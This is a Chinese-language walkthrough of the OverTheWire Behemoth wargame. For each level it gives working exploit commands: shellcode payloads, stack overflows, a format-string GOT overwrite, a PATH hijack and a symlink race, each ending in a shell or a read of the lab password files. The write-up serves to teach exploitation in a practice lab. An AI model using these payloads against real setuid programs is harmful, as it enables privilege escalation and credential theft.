---

title: CTF Waregames-Behemoth-Writeup
lang: zh
layout: article
show_subscribe: false
# full_width: true
tags: [wargame-ctf,Behemoth]

---

Behemoth wargame 包括缓冲区溢出,权限提升,格式化字符串漏洞，一些绕过。

## behemoth0 

**SSH:** ssh behemoth0@narnia.labs.overthewire.org -p 2221

**pass**: behemoth0

```bash
behemoth0@behemoth:~$  cd /behemoth/
behemoth0@behemoth:/behemoth$ ./behemoth0 
Password: demoo
Access denied..
```

用ltrace指令试下：

```bash
$ ltrace ./behemoth0 
__libc_start_main(0x80485b1, 1, 0xffc717b4, 0x8048680 <unfinished ...>
printf("Password: ")                                         = 10
__isoc99_scanf(0x804874c, 0xffc716bb, 142, 0xf7f5e224Password: asd
)       = 1
strlen("OK^GSYBEX^Y")                                        = 11
strcmp("asd", "eatmyshorts")                                 = -1
puts("Access denied.."Access denied..
)                                      = 16
+++ exited (status 0) +++
```

根据man手册页`man ltrace`:

> ltrace 指令可以截取并记录程序所调用的动态库与收到的信号。还可以截取并打印系统调用。



从输出可以看到strcmp函数的比较。输入这个试一下：

```bash
behemoth0@behemoth:/behemoth$ ./behemoth0
Password: eatmyshorts
Access granted..
$ whoami
behemoth1
$ cat /etc/behemoth_pass/behemoth1
aesebootiv

```

成功。

## Behemoth 01 

**SSH**:  ssh behemoth1@narnia.labs.overthewire.org -p 2221

**pass**: aesebootiv

鉴于国内网络环境，可以先把漏洞程序给dump下来,先本地分析，分析好利用方案之后,再在远程上猛操。自用dump脚本。

```bash
#!/usr/bin/env bash

###### preconfig here ##################

hostname="behemoth.labs.overthewire.org"
total_usr="behemoth"
port=2221

#########################################

file="/$total_usr/$total_usr"

# argument passed
usrid=$1
pass=$2

echo "sshpass -p "$pass" scp -P $port $total_usr$usr$usrid@$hostname:$file$usrid  ."

sshpass -p "$pass" scp -P $port $total_usr$usr$usrid@$hostname:$file$usrid  .

checksec $total_usr$usrid

```

dump 到本地慢慢分析：

```bash
$ ./crawl.sh  1 aesebootiv
sshpass -p aesebootiv scp -P 2221 behemoth1@behemoth.labs.overthewire.org:/behemoth/behemoth1  .
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

[*] '/home/z1933/workplace/vbshare/ctf/behemoth1'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments

```

ltrace试一下：
```bash
$ ltrace ./behemoth1 
__libc_start_main(0x804844b, 1, 0xffa9a0f4, 0x8048480 <unfinished ...>
printf("Password: ")                                             = 10
gets(0xffa9a015, 0xf7f782f0, 0, 0xf7d85362Password: demo
)                      = 0xffa9a015
puts("Authentication failure.\nSorry."Authentication failure.
Sorry.
)                          = 31
+++ exited (status 0) +++
```

这次不行。但是查看反汇编可以看到执行逻辑为：

```bash
$ objdump behemoth1 -d

0804844b <main>:
 804844b:	55                   	push   %ebp
 804844c:	89 e5                	mov    %esp,%ebp
 804844e:	83 ec 44             	sub    $0x44,%esp   # 栈上分配空间为0x44
 8048451:	68 00 85 04 08       	push   $0x8048500
 8048456:	e8 a5 fe ff ff       	call   8048300 <printf@plt>
 804845b:	83 c4 04             	add    $0x4,%esp
 804845e:	8d 45 bd             	lea    -0x43(%ebp),%eax # ebp-0x43 是字符串的输入的位置
 8048461:	50                   	push   %eax
 8048462:	e8 a9 fe ff ff       	call   8048310 <gets@plt>
 8048467:	83 c4 04             	add    $0x4,%esp
 804846a:	68 0c 85 04 08       	push   $0x804850c
 804846f:	e8 ac fe ff ff       	call   8048320 <puts@plt>
 8048474:	83 c4 04             	add    $0x4,%esp
 8048477:	b8 00 00 00 00       	mov    $0x0,%eax
 804847c:	c9                   	leave  
 804847d:	c3                   	ret    
 804847e:	66 90                	xchg   %ax,%ax
```

可以看到程序没有比较字符串的操作，就调了三个函数(`printf`,`gets`,`put`),但可以利用shellcode得到shell。

反汇编代码的分析见上面注释。

所以可以用67(0x44)+4=71来覆盖ebp,67(0x44)+4+4=75来覆盖返回地址。

执行到
```
(gdb) break main 
(gdb) run < <(python3 -c 'print(71 * "A" + "BBBB")')
```
执行到gets函数返回后：
```
   ┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
   │0x804844b <main>        push   %ebp                                                                               │
   │0x804844c <main+1>      mov    %esp,%ebp                                                                          │
   │0x804844e <main+3>      sub    $0x44,%esp                                                                         │
B+ │0x8048451 <main+6>      push   $0x8048500                                                                         │
>  │0x8048456 <main+11>     call   0x8048300 <printf@plt>                                                             │
   │0x804845b <main+16>     add    $0x4,%esp                                                                          │
   │0x804845e <main+19>     lea    -0x43(%ebp),%eax                                                                   │
   │0x8048461 <main+22>     push   %eax                                                                               │
   │0x8048462 <main+23>     call   0x8048310 <gets@plt>                                                               │
  >│0x8048467 <main+28>     add    $0x4,%esp                                                                          │
   │0x804846a <main+31>     push   $0x804850c                                                                         │
   │0x804846f <main+36>     call   0x8048320 <puts@plt>                                                               │
   │0x8048474 <main+41>     add    $0x4,%esp                                                                          │
   │0x8048477 <main+44>     mov    $0x0,%eax                                                                          │
   │0x804847c <main+49>     leave                                                                                     │
   │0x804847d <main+50>     ret                                                                                       │
   │0x804847e               xchg   %ax,%ax                                                                            │
   └──────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘
native process 16351 In: main                                                                      L??   PC: 0x8048467 
0x08048467 in main ()
(gdb) x/16wx $ebp
0xffffd5a8:     0x41414141      0x42424242      0x00000000      0xffffd644
0xffffd5b8:     0xffffd64c      0x00000000      0x00000000      0x00000000
0xffffd5c8:     0xf7fc5000      0xf7ffdc0c      0xf7ffd000      0x00000000
0xffffd5d8:     0x00000001      0xf7fc5000      0x00000000      0x9ee76be0
(gdb) x/8wx $ebp
0xffffd5a8:     0x41414141      0x42424242      0x00000000      0xffffd644
0xffffd5b8:     0xffffd64c      0x00000000      0x00000000      0x00000000
(gdb) 

```
ebp+4也就是main函数返回地址的位置已经被覆盖了。

还是用环境变量来写shellcode，因为不确定gdb中的栈地址和程序运行时的栈地址是不是一样的。秘制[shellcode](https://gist.github.com/Zhang1933/0d1c7b69af48483832eb2d6b22de287e)献上。

```bash
export SHELLCODE=$(python -c 'print 20 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0f\x2c\x04\xcd\x80"')
```

加了点雪橇,然后写一个程序找到环境变量地址,在文件`find_add.c`中：

```cpp
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char* argv[])
{
  printf("%s is at %p\n", argv[1], getenv(argv[1]));
}
```

```bash
behemoth1@behemoth:~$ cd /tmp
behemoth1@behemoth:/tmp$ mktemp -d 
/tmp/tmp.4Dzgraq6pX
behemoth1@behemoth:/tmp$ cd tmp.4Dzgraq6pX
behemoth1@behemoth:/tmp/tmp.4Dzgraq6pX$ gcc -m32 find_add.c -o find_add
behemoth1@behemoth:/tmp/tmp.4Dzgraq6pX$ ./find_add SHELLCODE
SHELLCODE is at 0xffffde26
behemoth1@behemoth:/tmp/tmp.4Dzgraq6pX$ cd /behemoth
behemoth1@behemoth:/behemoth$ (python -c 'print 71 * "\x90" + "\x26\xde\xff\xff"';cat) | ./behemoth1
Password: Authentication failure.
Sorry.

ls -la
total 80
drwxr-xr-x  2 root      root      4096 Aug 26  2019 .
drwxr-xr-x 27 root      root      4096 Aug 26  2019 ..
-r-sr-x---  1 behemoth1 behemoth0 5900 Aug 26  2019 behemoth0
-r-sr-x---  1 behemoth2 behemoth1 5036 Aug 26  2019 behemoth1
-r-sr-x---  1 behemoth3 behemoth2 7536 Aug 26  2019 behemoth2
-r-sr-x---  1 behemoth4 behemoth3 5180 Aug 26  2019 behemoth3
-r-sr-x---  1 behemoth5 behemoth4 7488 Aug 26  2019 behemoth4
-r-sr-x---  1 behemoth6 behemoth5 7828 Aug 26  2019 behemoth5
-r-sr-x---  1 behemoth7 behemoth6 7564 Aug 26  2019 behemoth6
-r-xr-x---  1 behemoth7 behemoth6 7528 Aug 26  2019 behemoth6_reader
-r-sr-x---  1 behemoth8 behemoth7 5676 Aug 26  2019 behemoth7
whoami
behemoth2
cat /etc/behemoth_pass/behemoth2
eimahquuof
```

最好还是python2来写，之前用python3写发现输入的数据不对。

下面我直接用热门反汇编工具IDA来解题,顺便熟悉IDA的使用。

## Behemoth 02 

**SSH:** ssh behemoth2@narnia.labs.overthewire.org -p 2221

**Pasa:** eimahquuof

先dump下来，分析一下


```bash
$ ./crawl.sh 2 eimahquuof
sshpass -p eimahquuof scp -P 2221 behemoth2@behemoth.labs.overthewire.org:/behemoth/behemoth2  .
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

[*] '/home/z1933/workplace/vbshare/ctf/behemoth2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

$ file behemoth2 
behemoth2: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=87daf01f3941b5f8f815d758ed9e90589a9d315c, not stripped
```

拿到IDA(这里所用的版本为7.5)中反汇编看一下。F5反汇编代码,用鼠标右键上下文菜单加了点注释，改了下变量名。

```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __uid_t v3; // ebx
  __uid_t v4; // eax
  __uid_t v5; // ebx
  __uid_t v6; // eax
  stat stat_buf; // [esp+0h] [ebp-88h] BYREF
  char buffer[6]; // [esp+64h] [ebp-24h] BYREF buffer[20]
  __int16 v10; // [esp+6Ah] [ebp-1Eh] BYREF
  char *name; // [esp+78h] [ebp-10h]
  __pid_t pid; // [esp+7Ch] [ebp-Ch]
  int *v13; // [esp+80h] [ebp-8h]

  v13 = &argc;
  pid = getpid();
  name = (char *)&v10;                          // name=buffer+6
  sprintf(buffer, "touch %d", pid);
  if ( (lstat(name, &stat_buf) & 0xF000) != 0x8000 )
  {
    unlink(name);
    v3 = geteuid();
    v4 = geteuid();
    setreuid(v4, v3);
    system(buffer);
  }
  sleep(2000u);
  qmemcpy(buffer, "cat  ", 5);
  v5 = geteuid();
  v6 = geteuid();
  setreuid(v6, v5);
  system(buffer);
  return 0;
}
```

每个函数查一下linux手册看一下功能。可以推断出程序大概逻辑是：

1. buffer里面写入`touch $pid`
2. name的值就是pid，lstat因为没有这个文件会返回FFFF，条件判断会一直判断为真。
3. 无脑执行system(touch $pid).

    关于setreuid函数的参数,Real User ID, Effective UserId,Saved User ID 可以参考[Difference between Real User ID, Effective User ID and Saved User ID](https://stackoverflow.com/questions/32455684/difference-between-real-user-id-effective-user-id-and-saved-user-id)

所以我们可以创建一个假的touch文件,写入:
```
/bin/sh
```

执行这个touch的话,系统会执行`/bin/sh`。关于这个和shellbang的关系，可以参考[Why should the shebang line always be the first line?](https://stackoverflow.com/questions/12910744/why-should-the-shebang-line-always-be-the-first-line)。

```bash
behemoth2@behemoth:~$ cd /tmp/
# 不要有其他字符,之前包括"."号失败了。
behemoth2@behemoth:/tmp$ cd /tmp/ZYV0tpD7uD
# 创建假的touch 
behemoth2@behemoth:/tmp/ZYV0tpD7uD$ echo "/bin/sh" > touch
behemoth2@behemoth:/tmp/ZYV0tpD7uD$ chmod +x touch
behemoth2@behemoth:/tmp/ZYV0tpD7uD$ export PATH=/tmp/ZYV0tpD7uD:$PATH
behemoth2@behemoth:/tmp/ZYV0tpD7uD$ /behemoth/behemoth2
$ whoami	
behemoth3
$ cat /etc/behemoth_pass/behemoth3
nieteidiel
```

## Behemoth 03 

**SSH :** ssh behemoth3@narnia.labs.overthewire.org -p 2221

**Pass :** nieteidiel

比较好的题，帮我复习了动态链接和格式化字符串漏洞。

鉴于网络原因,还是用前面的脚本dump下来,扔到IDA中反汇编分析。

```bash
$ ./crawl.sh 3 nieteidiel
sshpass -p nieteidiel scp -P 2221 behemoth3@behemoth.labs.overthewire.org:/behemoth/behemoth3  .
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

[*] '/home/z1933/workplace/vbshare/ctf/behemoth3'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments

```

IDA反编译结果：

```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buffer[200]; // [esp+0h] [ebp-C8h] BYREF

  printf("Identify yourself: ");
  fgets(buffer, 200, stdin);
  printf("Welcome, ");
  printf(buffer);
  puts("\naaaand goodbye again.");
  return 0;
}
```

看到`printf(buffer)`,经典的格式化字符串漏洞:

```bash
└─$ ./behemoth3 
Identify yourself: %p,%p
Welcome, 0x252c7025,0xa70

aaaand goodbye again.
```

补充一下前置知识，已经知道的可以跳过。

---

**动态链接过程的延迟绑定:**

关于详细动态链接，(延迟绑定) lazy binding 可以参考[GOT and PLT for pwning.](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html),以及书《CSAPP》中7.12节 `Position-Independent Code(PIC)`。

这里简单说下延迟绑定流程,以在位置`.text:08048489`处调用`printf`函数为例,如何解析,可以用IDA动态调试来验证:

&ensp;&ensp; **初始化过程:**

&ensp;&ensp;&ensp;&ensp; 1. 加载器将的GOT表下标3开始的项初始化为其对应PLT条目的第二条指令。这里我用GOT表项下多个写断点来验证的,发现断点触发时，多个项都已经更新了。

&ensp;&ensp;&ensp;&ensp; 2. 记载器加载和运行动态连接器。动态链接器初始化GOT[1],GOT[2]。GOT[2]是动态连接器在ld-linux.so的入口点,GOT[1],GOT[0]是动态链接器需要用的的其他信息。
&ensp;&ensp;

&ensp;&ensp; **lazy binding过程：**

&ensp;&ensp;&ensp;&ensp;1. 调用`printf`跳转到其对应的PLT条目第一条指令。

&ensp;&ensp;&ensp;&ensp;2. 通过`printf`对应的GOT表项间接跳转跳转到PLT条目的下一条指令(因为其GOT表项被初始化为PLT条目下一条指令)。

&ensp;&ensp;&ensp;&ensp;3. 将函数ID入栈。跳转到PLT[0]第一条指令。

&ensp;&ensp;&ensp;&ensp;4. PLT[0]通过GOT[1]间接地把动态链接器第一个参数入栈，然后通过GOT[2]间接跳转到动态连接器中。动态链接器确定`printf`的运行时位置后用这个地址重写printf对应的GOT条目。再把控制传递给`printf`。

&ensp;&ensp; **下一次调用`printf`过程** 和上面步骤一样，不同的是`printf`对应的GOT表项有`printf`函数的地址了，步骤2就可以直接跳转到`printf`函数地址了。

---

上述就是延迟绑定的过程,现在让我们回到这道题中来。



可以看出`.got.plt`节是一个可写的存有函数指针的数组,并且加载到内存中的地址还可以预测,我们利用字符串格式漏洞 **任意地址写** 来完成。

---

**格式化字符任意写原理:**

关于格式化字符串漏洞可以参考这篇[文章](https://axcheron.github.io/exploit-101-format-strings/#random-write)。这里简单说下利用原理。

* 可以用`%<num>$n`来指定写入位置,`%n`接受的是一个地址参数，将会在那个地址里面写入。`%<num>$s`可以指定读位置,同样接受的是地址参数。比如`printf("%2$x", 1, 2, 3)`将会打印2。
* `AAAA%96x%7$n`将会在第七个(从0开始,第0个参数是format字符串指针)参数地址所对应的内存上写100。
* 想写入的数可能很大,比如写地址的时候,要经过很久才能输出得完,但我们可以拆分成2字节来写(%hn)。

---

知道原理了，就可以回到这道题中来了。

* 在进入位于地址`080484BF`的`printf`函数之前，栈上format指针参数与实际内容相差1个地址。
* 我们需要写的地址是`0x080497AC`,也就是GOT表中,puts函数的地址,这里用一个还没有解析的函数地址来写。
* 在GOT表中，我们需要写入环境变量中SHELLCODE的地址。

```bash
behemoth3@behemoth:~$ cd /tmp/tmp.Yi69vHyF7y
behemoth3@behemoth:/tmp/tmp.Yi69vHyF7y$ export SHELLCODE=$(python -c 'print 20 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0f\x2c\x04\xcd\x80"')
behemoth3@behemoth:/tmp/tmp.Yi69vHyF7y$ ./find_add SHELLCODE
SHELLCODE is at 0xffffde25
```

有个问题，拿到SHELLCODE地址为`0xffffde25`，因为写的数量只能是递增的,所以我们需要从低位先写。

所以我们构造的字符串看起来像这样：`\xac\x97\x04\x08\xae\x97\x04\x08<val1>x%1$hn%<val2>%2$hn`

这里shellcode的地址为:

* `\xac\x97\x04\x08`,或者`0x080497ac`指向要写入数据的低2字节地址。
* `\xae\x97\x04\x08`,或者`0x080497ae`指向要写入的高2字节地址。
* val1写`0xde25-0x8`=0xDE1D=56861
* val2写`0xffff-0xde25`=0x21DA=8666

所以最后：

```bash
behemoth3@behemoth:/behemoth$ (python -c 'print "\xac\x97\x04\x08\xae\x97\x04\x08%56861x%1$hn%8666x%2$hn"';cat) | ./behemoth3
# 经过一段输出之后....
whoami
behemoth4
cat /etc/behemoth_pass/behemoth4
ietheishei
```

---

**RELRO机制:**

用RELRO机制防止GOT表被写可以参考[Hardening ELF binaries using Relocation Read-Only (RELRO)](https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro)。

这里简单的说下不同，Partial RELRO把GOT节移到数据节(.data 和 .bss)上面去了,可以防止数据节的数据溢出到GOT中,但运行时GOT仍然可以写,不能防止格式化字符串漏洞。

FULL RELRO 除了干Partial RELRO要干的事情的以外，会在程序一开始就把GOT表填好,不采用延迟绑定机制。填好表后将GOT节设置为只读,可以防止格式化字符串漏洞。因为效率问题，Partial RELRO为编译默认选择。

---

## Behemoth 04

**SSH :** ssh behemoth4@narnia.labs.overthewire.org -p 2221

**Pass :** ietheishei

还是先dump下来,扔到IDA中反汇编分析。

```bash
$ ./crawl.sh 4 ietheishei
sshpass -p ietheishei scp -P 2221 behemoth4@behemoth.labs.overthewire.org:/behemoth/behemoth4  .
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

[*] '/home/z1933/workplace/vbshare/ctf/behemoth4'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

```

反编译结果,改了一些变量名:

```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buffer[20]; // [esp+0h] [ebp-28h] BYREF
  int c; // [esp+14h] [ebp-14h]
  FILE *stream; // [esp+18h] [ebp-10h]
  __pid_t pid; // [esp+1Ch] [ebp-Ch]

  pid = getpid();
  sprintf(buffer, "/tmp/%d", pid);
  stream = fopen(buffer, "r");
  if ( stream )
  {
    sleep(1u);
    puts("Finished sleeping, fgetcing");
    while ( 1 )
    {
      c = fgetc(stream);
      if ( c == -1 )
        break;
      putchar(c);
    }
    fclose(stream);
  }
  else
  {
    puts("PID not found!");
  }
  return 0;
}
```

可以看出程序逻辑大概是: 读文件"/tmp/$pid"，并输出。如果没有要读的文件就退出。

所以思路就是在程序开始时将他挂起(kill -STOP命令)，然后创建密码软链接,然后让程序接着执行，让他读出包含密码的文件。写个test.sh脚本：

```bash
/behemoth/behemoth4& # 后台执行
PID=$! # $! 得到最近一次后台执行的命令的pid
kill -STOP $PID
ln -s /etc/behemoth_pass/behemoth5 /tmp/$PID
kill -CONT $PID
echo $PID
```

---

关于`$!`可以参考[In Bash scripting, what's the meaning of " $! "?](https://unix.stackexchange.com/questions/85021/in-bash-scripting-whats-the-meaning-of)

---

总的过程:
```sh
behemoth4@behemoth:~$ vim /tmp/demo.sh
behemoth4@behemoth:~$ bash /tmp/demo.sh
24945
behemoth4@behemoth:~$ Finished sleeping, fgetcing
aizeeshing
```

## Behemoth 05

**SSH :** ssh behemoth5@narnia.labs.overthewire.org -p 2221

**Pass :** aizeeshing

日常dump下来：

```bash
$ ./crawl.sh 5 aizeeshing
sshpass -p aizeeshing scp -P 2221 behemoth5@behemoth.labs.overthewire.org:/behemoth/behemoth5  .
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

[*] '/home/z1933/workplace/vbshare/ctf/behemoth5'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

IDA没看出什么，搭建本地环境用ltrace执行看下是个什么情况：

切成sudo用户：
```bash
$ mkdir /etc/behemoth_pass
$ echo abcd > /etc/behemoth_pass/behemoth6
```

再切回普通用户:
```bash
└─$ ltrace ./behemoth5
__libc_start_main(0x804872b, 1, 0xffffd264, 0x8048920 <unfinished ...>
fopen("/etc/behemoth_pass/behemoth6", "r")       = 0x804b1a0
fseek(0x804b1a0, 0, 2, 0xf7fa8a08)               = 0
ftell(0x804b1a0, 0, 2, 0xf7fa8a08)               = 5
rewind(0x804b1a0, 0, 2, 0xf7fa8a08)              = 0
malloc(6)                                        = 0x804c2f0
fgets("abcd\n", 6, 0x804b1a0)                    = 0x804c2f0
strlen("abcd\n")                                 = 5
fclose(0x804b1a0)                                = 0
gethostbyname("localhost")                       = 0xf7fa9fb8
socket(2, 2, 0)                                  = 3
atoi(0x80489e4, 2, 0, 0xf7fa8a08)                = 1337
htons(1337, 2, 0, 0xf7fa8a08)                    = 0x3905
memset(0xffffd180, '\0', 8)                      = 0xffffd180
strlen("abcd\n")                                 = 5
sendto(3, 0x804c2f0, 5, 0)                       = 5
close(3)                                         = 0
exit(0 <no return ...>
+++ exited (status 0) +++
```

用IDA反编译分析把逻辑还原了一下，从发包开始。下面代码可以复制到现代编辑器里面查看函数，常亮的定义慢慢理解:

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include<netinet/in.h>
#include <netdb.h>
#include<string.h>
// gcc -z execstack -z norelro -fno-stack-protector -o format1 format1.c
int main(int argc, char *argv[]){
    // ... 
    char *passcontent;


    struct hostent *host;
   /*  sockaddr_in 和 sockaddr区别： https://www.iteye.com/blog/kenby-1149001
    */
    struct sockaddr_in addr;
    host=gethostbyname("loacalhost");
    int fd=socket(AF_INET,SOCK_DGRAM,0);// 0:IP 协议
    addr.sin_family=AF_INET;
    addr.sin_port=1337;
    addr.sin_addr.s_addr=**host->h_addr_list;
    int stat=sendto(fd,passcontent,strlen(passcontent),0,( struct sockaddr *)&addr,sizeof(addr));// 发数据
    if(stat==-1){
        perror("sendto");
        exit(1);
    }
    // ...
}
```

这里大概说一下逻辑: 读文件并发包，发udp包到本地端口1337。所以我们需要开一个本地监听udp包的1337端口，然后再起一个终端调用`behemoth5`让他乖乖发数据发过来就ok了。

```bash
# shell 1
behemoth5@behemoth:~$ nc -ulp 1337

# shell 2
behemoth5@behemoth:/behemoth$ ./behemoth5

# shell  1 输出：
behemoth5@behemoth:~$ nc -ulp 1337
mayiroeche

```

## behemoth 06

**SSH:** ssh behemoth6@narnia.labs.overthewire.org -p 2221

**pass:** mayiroeche

这次有两个文件，先把第一个文件dump下来。

```bash
$ ./crawl.sh 6 mayiroeche
sshpass -p mayiroeche scp -P 2221 behemoth6@behemoth.labs.overthewire.org:/behemoth/behemoth6  .
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

[*] '/home/z1933/workplace/vbshare/ctf/behemoth6'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

```
把`behemoth6_reader` 也dump下来。
```bash
sshpass -p mayiroeche scp -P 2221 behemoth6@behemoth.labs.overthewire.org:/behemoth/behemoth6_reader .
```

都拿到IDA中反编译分析一波。

可以看出大概逻辑是behemoth6需要接受behemoth6_reader的输出，输出需要是`HelloKitty`。`behemoth6_reader`读取`shellcode.txt`字节并执行，但shellcode字节内容+字节下标不能等于11,避开前11检查的办法可以填充`0x90`至到11。

好吧，这道题就是写一个汇编程序的输出`HelloKitty`的shellcode,提取出机器码就ok了。

关于如何写可以参考[Linux Shellcode "Hello, World!"](https://stackoverflow.com/questions/15593214/linux-shellcode-hello-world)

HelloKitty.s文件中写入:

```
global _start

section .text

_start:
    jmp MESSAGE      ; 1) lets jump to MESSAGE

GOBACK:
    mov eax, 0x4
    mov ebx, 0x1
    pop ecx          ; 3) we are poping into `ecx`, now we have the
                     ; address of "Hello, World!\r\n" 
    mov edx, 0xa
    int 0x80

    mov eax, 0x1
    mov ebx, 0x0
    int 0x80

MESSAGE:
    call GOBACK       ; 2) we are going back, since we used `call`, that means
                      ; the return address, which is in this case the address 
                      ; of "Hello, World!\r\n", is pushed into the stack.
    db "HelloKitty"

section .data
```

```bash
$ nasm -f elf HelloKitty
$ ld -m elf_i386 HelloKitty.o -o HelloKitty
$ $ ./HelloKitty 
HelloKitty
```

然后objdump提取：

```bash
objdump -d ./HelloKitty |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
```

登录到远程开始操作:

```bash
behemoth6@behemoth:/tmp/eZqWxxwYkV$ (python -c "print 11*'\x90'+'\xeb\x1e\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\x59\xba\x0a\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xdd\xff\xff\xff\x48\x65\x6c\x6c\x6f\x4b\x69\x74\x74\x79'") > shellcode.txt
behemoth6@behemoth:/tmp/eZqWxxwYkV$ /behemoth/behemoth6
Correct.
$ whoami
behemoth7
$ cat /etc/behemoth_pass/behemoth7
baquoxuafo
$ 
```

## Behemoth 07


**SSH:** ssh behemoth7@narnia.labs.overthewire.org -p 2221

**PASS:** baquoxuafo

依旧先dump下来分析。

```bash
$ ./crawl.sh  7 baquoxuafo
sshpass -p baquoxuafo scp -P 2221 behemoth7@behemoth.labs.overthewire.org:/behemoth/behemoth7  .
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

[*] '/home/z1933/workplace/vbshare/ctf/behemoth7'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

用IDA分析一下。

`__ctype_b_loc`函数参考：[__ctype_b_loc what is its purpose?](https://stackoverflow.com/questions/37702434/ctype-b-loc-what-is-its-purpose)。简单的说，这个函数就是返回一个ascii字符的表，表项(unsigned short)表示每个字符的特征，比如是否大小写，是否为打印字符等。isprintf，islower函数实际上就是包装了一下上面这个函数。

这里要让其判断为假，要么是字母数字要么是标点符号。但是漏洞利用点是其只检查了前512字节,把shellcode地址写在后面就OK了。还有就是程序一开始把环境变量清0了,所以环境变量不行，只能在栈上加点雪橇硬写了。


从ebp-524字节处开始写,用gdb调试,看一下栈上的情况:

```
(gdb) run $(python -c "print 528*'A'+'\xc0\xd5\xff\xff'+ 200*'\x90'+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0f\x2c\x04\xcd\x80'")
Starting program: /behemoth/behemoth7 $(python -c "print 528*'A'+'\xc0\xd5\xff\xff'+ 200*'\x90'+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0f\x2c\x04\xcd\x80'")

Breakpoint 1, 0x08048640 in main ()
(gdb) x/300wx
Argument required (starting display address).
(gdb) x/300wx $ebp
0xffffd2b8:	0x41414141	0xffffd5c0	0x90909090	0x90909090
0xffffd2c8:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd2d8:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd2e8:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd2f8:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd308:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd318:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd328:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd338:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd348:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd358:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd368:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd378:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd388:	0x6850c031	0x68732f2f	0x69622f68	0x31e3896e
0xffffd398:	0xb0d231c9	0xcd042c0f	0xffff0080	0xffffdeda
0xffffd3a8:	0xffffdeed	0xffffdef9	0xffffdf12	0xffffdf22
0xffffd3b8:	0xffffdf36	0xffffdf41	0xffffdf49	0xffffdf62
0xffffd3c8:	0xffffdf74	0xffffdfb2	0xffffdfd0	0x00000000
0xffffd3d8:	0x00000020	0xf7fd7c90	0x00000021	0xf7fd7000
0xffffd3e8:	0x00000010	0x178bfbff	0x00000006	0x00001000
0xffffd3f8:	0x00000011	0x00000064	0x00000003	0x08048034
0xffffd408:	0x00000004	0x00000020	0x00000005	0x00000008
0xffffd418:	0x00000007	0xf7fd9000	0x00000008	0x00000000
0xffffd428:	0x00000009	0x08048430	0x0000000b	0x000032cf
0xffffd438:	0x0000000c	0x000032cf	0x0000000d	0x000032cf
0xffffd448:	0x0000000e	0x000032cf	0x00000017	0x00000001
0xffffd458:	0x00000019	0xffffd48b	0x0000001a	0x00000000

```

选一个雪橇中间的位置,这里选择`0xffffd328`,返回地址写入`0xffffd328`,构造字符串:

```bash
behemoth7@behemoth:/behemoth$ ./behemoth7   $(python -c "print 528*'A'+'\x28\xd3\xff\xff'+ 200*'\x90'+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0f\x2c\x04\xcd\x80'")
$ whoami
behemoth8
$ cat /etc/behemoth_pass/behemoth8
pheewij7Ae
$ 

```

